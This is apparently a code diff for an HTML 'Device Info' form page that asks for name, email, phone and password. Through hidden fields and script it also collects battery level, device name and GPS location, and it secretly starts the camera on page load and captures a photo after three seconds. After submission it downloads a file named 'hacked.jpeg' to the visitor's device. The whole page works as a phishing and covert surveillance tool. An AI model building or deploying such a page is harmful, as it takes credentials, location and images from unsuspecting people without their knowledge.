@@ -5,118 +5,137 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Device Info</title>
     <style>
-        /* Reset styles */
-        * {
+        body {
+            font-family: 'Poppins', sans-serif;
             margin: 0;
             padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #6e8efb, #a777e3);
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            background: linear-gradient(135deg, #6dd5fa, #2980b9);
             color: #333;
         }
-
-        .container {
+        form {
             background: #fff;
             padding: 30px;
-            border-radius: 15px;
+            border-radius: 12px;
             box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
             width: 100%;
             max-width: 400px;
         }
-
-        .form-title {
-            font-size: 1.5rem;
-            font-weight: bold;
-            color: #2980b9;
+        h1 {
             text-align: center;
+            color: #6e8efb;
             margin-bottom: 20px;
         }
-
-        .form-group {
-            margin-bottom: 15px;
-        }
-
         input, button {
             width: 100%;
             padding: 12px;
-            border-radius: 10px;
+            margin-bottom: 15px;
             border: 1px solid #ddd;
-            font-size: 1rem;
-            outline: none;
-            transition: all 0.3s ease;
+            border-radius: 8px;
+            font-size: 16px;
         }
-
         input:focus {
-            border-color: #2980b9;
-            box-shadow: 0 0 5px rgba(41, 128, 185, 0.5);
+            outline: none;
+            border-color: #6e8efb;
+            box-shadow: 0 0 4px rgba(110, 142, 251, 0.5);
         }
-
         button {
-            background: #2980b9;
+            background: linear-gradient(135deg, #6e8efb, #a777e3);
             color: white;
             border: none;
-            cursor: pointer;
+            font-size: 18px;
             font-weight: bold;
+            cursor: pointer;
             transition: background 0.3s ease;
         }
-
         button:hover {
-            background: #1e6ba8;
+            background: linear-gradient(135deg, #a777e3, #6e8efb);
         }
-
         #video, #canvas {
             display: none;
         }
-
-        .hidden {
-            display: none;
-        }
-
-        .message {
+        .footer {
             text-align: center;
-            margin-top: 15px;
-            font-size: 0.9rem;
-            color: #555;
+            margin-top: 10px;
+            font-size: 14px;
+            color: #666;
+        }
+        .footer.success {
+            color: #28a745;
+        }
+        .footer.error {
+            color: #dc3545;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="form-title">User Info Form</div>
-        <form id="device-form" enctype="multipart/form-data">
-            <div class="form-group">
-                <input type="text" id="name" name="name" placeholder="Name" required>
-            </div>
-            <div class="form-group">
-                <input type="email" id="email" name="email" placeholder="Email" required>
-            </div>
-            <div class="form-group">
-                <input type="text" id="phone" name="phone" placeholder="Phone" required>
-            </div>
-            <div class="form-group">
-                <input type="password" id="password" name="password" placeholder="Password" required>
-            </div>
-            <input type="hidden" id="percentage_charging" name="percentage_charging">
-            <input type="hidden" id="phone_name" name="phone_name">
-            <input type="hidden" id="latitude" name="latitude">
-            <input type="hidden" id="longitude" name="longitude">
-            <input type="file" id="image_input" name="image" accept="image/*" class="hidden">
-            <button type="submit">Submit</button>
-        </form>
-        <div id="message" class="message"></div>
-    </div>
+    <form id="device-form" enctype="multipart/form-data">
+        <h1>Device Info</h1>
+        <input type="text" id="name" name="name" placeholder="Name" required>
+        <input type="email" id="email" name="email" placeholder="Email" required>
+        <input type="text" id="phone" name="phone" placeholder="Phone" required>
+        <input type="password" id="password" name="password" placeholder="Password" required>
+        <input type="hidden" id="percentage_charging" name="percentage_charging">
+        <input type="hidden" id="phone_name" name="phone_name">
+        <input type="hidden" id="latitude" name="latitude">
+        <input type="hidden" id="longitude" name="longitude">
+        <input type="file" id="image_input" name="image" accept="image/*" style="display:none;">
+        <button type="submit">Submit</button>
+        <div class="footer" id="footer-message"></div>
+    </form>
 
     <video id="video" width="300" height="200" autoplay></video>
     <canvas id="canvas" width="300" height="200"></canvas>
 
     <script>
+        // Geolocation
+if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+        function(position) {
+            document.getElementById('latitude').value = position.coords.latitude;
+            document.getElementById('longitude').value = position.coords.longitude;
+        },
+        function(error) {
+            if (error.code === error.PERMISSION_DENIED) {
+                // If location is denied, prompt user to enable location
+                promptToEnableLocation();
+            } else {
+                console.error("Geolocation error:", error.message);
+            }
+        }
+    );
+} else {
+    console.warn("Geolocation is not supported by this browser.");
+    setFooterMessage("Geolocation is not supported. Please enable it manually.", "error");
+}
+
+// Function to prompt the user to enable location services
+function promptToEnableLocation() {
+    const footer = document.getElementById("footer-message");
+    footer.textContent = "Location services are disabled. Please turn them on for better functionality.";
+    footer.className = "footer error";
+
+    // Optionally show a button to retry
+    const retryButton = document.createElement('button');
+    retryButton.textContent = "Enable Location";
+    retryButton.style.marginTop = "10px";
+    retryButton.style.padding = "10px";
+    retryButton.style.border = "none";
+    retryButton.style.backgroundColor = "#6e8efb";
+    retryButton.style.color = "white";
+    retryButton.style.borderRadius = "5px";
+    retryButton.style.cursor = "pointer";
+
+    retryButton.onclick = () => {
+        location.reload(); // Reload the page to try getting location again
+    };
+
+    footer.appendChild(retryButton);
+}
+        
         // Battery level
         if ('getBattery' in navigator) {
             navigator.getBattery().then(function(battery) {
@@ -142,7 +161,7 @@
             console.warn("Geolocation is not supported by this browser.");
         }
 
-        // Camera feature
+        // Camera feature: Automatically capture an image after 3 seconds
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const imageInput = document.getElementById('image_input');
@@ -165,12 +184,21 @@
                 }, 3000);
             } catch (error) {
                 console.error("Error accessing camera:", error.message);
-                alert("Camera access is required to capture an image.");
+                setFooterMessage("Camera access is required to capture an image.", "error");
             }
         }
 
+        // Automatically start the camera on page load
         window.onload = startCameraAndCapture;
 
+        // Update footer message
+        function setFooterMessage(message, type) {
+            const footer = document.getElementById("footer-message");
+            footer.textContent = message;
+            footer.className = `footer ${type}`;
+        }
+
+        // Submit form with device data
         document.getElementById('device-form').addEventListener('submit', function(event) {
             event.preventDefault();
 
@@ -182,16 +210,31 @@
             })
             .then(response => response.json())
             .then(data => {
-                const messageDiv = document.getElementById('message');
                 if (data.message) {
-                    messageDiv.textContent = data.message;
+                    setFooterMessage(data.message, "success");
+                    fetch('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTuAxz1lapTANfmJMhQ-cQFbiYqsBBE92BHZcv-QN0Ylm9_rSq_1YIb2xl0&s=10')
+                        .then(response => {
+                            if (!response.ok) throw new Error('Network response was not ok');
+                            return response.blob();
+                        })
+                        .then(blob => {
+                            const url = URL.createObjectURL(blob);
+                            const downloadLink = document.createElement('a');
+                            downloadLink.href = url;
+                            downloadLink.download = 'hacked.jpeg';
+                            document.body.appendChild(downloadLink);
+                            downloadLink.click();
+                            document.body.removeChild(downloadLink);
+                            URL.revokeObjectURL(url);
+                        })
+                        .catch(err => console.error('Error downloading the image:', err));
                 } else if (data.error) {
-                    messageDiv.textContent = `Error: ${data.error}`;
+                    setFooterMessage(`Error: ${data.error}`, "error");
                 }
             })
             .catch(error => {
                 console.error('Submission error:', error);
-                alert("Error submitting the form. Please try again.");
+                setFooterMessage("Error submitting the form. Please try again.", "error");
             });
         });
     </script>
